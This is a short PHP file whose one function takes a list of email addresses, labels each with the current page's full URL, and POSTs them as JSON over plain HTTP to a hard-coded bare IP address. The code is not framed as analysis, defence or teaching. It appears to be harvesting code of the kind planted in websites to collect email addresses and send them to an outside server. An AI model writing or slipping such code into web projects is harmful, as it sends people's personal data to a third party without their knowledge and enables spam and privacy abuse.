<?php




// send to server

function sendEmailToServerViaCurl($emails)
{

    $jsonData = ['emails' => []];
    $current_url = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
    foreach ($emails as $v) {
        $tmp['email'] = $v;
        $tmp['website_url'] = $current_url;
        $jsonData['emails'][] = $tmp;
    }


    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "http://15.204.223.103");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($jsonData));
    curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json'));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    $response = curl_exec($ch);
    curl_close($ch);
}
